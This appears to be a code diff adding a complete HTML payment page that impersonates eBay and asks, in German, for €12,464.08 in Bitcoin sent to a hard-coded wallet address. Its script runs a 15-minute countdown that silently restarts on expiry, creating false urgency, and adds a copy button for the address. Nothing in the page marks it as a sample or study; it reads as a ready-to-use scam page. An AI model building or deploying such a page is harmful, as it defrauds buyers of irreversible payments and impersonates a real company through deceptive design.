@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>Bitcoin Payment – Ebay</title>
+<style>
+  :root{
+    --accent:#f7931a;
+    --dark:#0f172a;
+    --muted:#6b7280;
+    --radius:14px;
+  }
+  body{margin:0;font-family:Inter,system-ui;background:#f8fafc;color:var(--dark);padding:18px;}
+  .container{max-width:480px;margin:0 auto;}
+
+  .card{
+    background:#fff;
+    padding:20px;
+    border-radius:var(--radius);
+    box-shadow:0 6px 20px rgba(0,0,0,0.08);
+    margin-top:20px;
+  }
+
+  .logo{
+    font-size:26px;
+    font-weight:800;
+    color:var(--accent);
+    text-align:center;
+    margin-top:10px;
+  }
+
+  .amount{
+    text-align:center;
+    margin-top:10px;
+    font-size:20px;
+    font-weight:700;
+  }
+
+  .btc-box{
+    margin-top:20px;
+    background:#fff7e6;
+    padding:16px;
+    border-radius:10px;
+    border:1px solid #ffe2b9;
+  }
+
+  .btc-row{display:flex;align-items:center;justify-content:space-between;gap:10px;}
+  .btc-address{word-break:break-all;font-size:15px;font-weight:600;color:var(--dark);}
+  .copy-btn{
+    background:var(--accent);
+    color:#fff;
+    border:none;
+    padding:8px 14px;
+    border-radius:8px;
+    font-weight:700;
+    cursor:pointer;
+  }
+
+  .timer{
+    margin-top:16px;
+    font-size:18px;
+    font-weight:700;
+    color:#d92828;
+    text-align:center;
+  }
+
+  .note{
+    margin-top:20px;
+    font-size:14px;
+    color:var(--muted);
+    line-height:1.6;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo"><a style="font-weight: bold; color: red; font-size: 35px; text-decoration: none; outline: none;" href="">e</a><a style="font-weight: bold; color: blue; font-size: 35px; text-decoration: none; outline: none;" href="">b</a><a style="font-weight: bold; color: yellow; font-size: 35px; text-decoration: none; outline: none;" href="">a</a><a style="font-weight: bold; color: green; font-size: 35px; text-decoration: none; outline: none;" href="">y</a></div>
+
+    <div class="card">
+      <div class="amount">Total: <span style="color:var(--accent)">€12,464.08</span></div>
+
+      <div style="text-align:center;margin-top:8px;font-size:14px;color:var(--muted)">Mit Bitcoin bezahlen</div>
+
+      <div class="btc-box">
+        <div class="btc-row">
+          <div class="btc-address" id="btcAddress">1DfZnsMarDVnhd3RP6hqt54BbtKy7VrgGN</div>
+          <button class="copy-btn" id="copyBtn">Kopieren</button>
+        </div>
+      </div>
+
+      <div class="timer">Verbleibende Zeit: <span id="countdown">15:00</span></div>
+
+      <div class="note">
+        ⚠ Bitte senden Sie den genauen Bitcoin-Betrag an die oben angegebene Adresse.<br><br>
+        • Die Zahlung wird automatisch bestätigt, sobald sie eingegangen ist.<br>
+        • Stellen Sie sicher, dass Sie die Adresse korrekt kopieren und einfügen.<br>
+        • Ihre Lieferung wird innerhalb von 2 Arbeitstagen bearbeitet, sobald die Zahlung bestätigt ist.
+      </div>
+    </div>
+  </div>
+
+<script>
+// -------- Persistent 15-minute timer with reset on expiry --------
+const TIMER_KEY = "ecbay_payment_timer_start";
+const DURATION = 15 * 60 * 1000; // 15 minutes
+
+function getStartTime(){
+  let saved = localStorage.getItem(TIMER_KEY);
+  const now = Date.now();
+
+  if(!saved){
+    localStorage.setItem(TIMER_KEY, now);
+    return now;
+  }
+
+  saved = parseInt(saved);
+
+  // If expired, reset timer
+  if(now - saved >= DURATION){
+    localStorage.setItem(TIMER_KEY, now);
+    return now;
+  }
+
+  return saved;
+}
+
+let startTime = getStartTime();
+let endTime = startTime + DURATION;
+
+function updateTimer(){
+  const now = Date.now();
+  let diff = endTime - now;
+
+  if(diff <= 0){
+    // Reset timer immediately when expired
+    const newStart = Date.now();
+    localStorage.setItem(TIMER_KEY, newStart);
+    startTime = newStart;
+    endTime = newStart + DURATION;
+    diff = endTime - newStart;
+  }
+
+  let mins = Math.floor(diff / 60000);
+  let secs = Math.floor((diff % 60000) / 1000);
+  if(mins < 10) mins = "0" + mins;
+  if(secs < 10) secs = "0" + secs;
+
+  document.getElementById("countdown").innerText = mins + ":" + secs;
+}
+setInterval(updateTimer, 1000);
+updateTimer();
+
+// -------- Copy BTC Address --------
+const copyBtn = document.getElementById("copyBtn");
+copyBtn.addEventListener("click", () => {
+  const addr = document.getElementById("btcAddress").innerText;
+  navigator.clipboard.writeText(addr).then(() => {
+    copyBtn.innerText = "Copied!";
+    setTimeout(()=> copyBtn.innerText = "Copy", 2000);
+  });
+});
+</script>
+</body>
+</html>
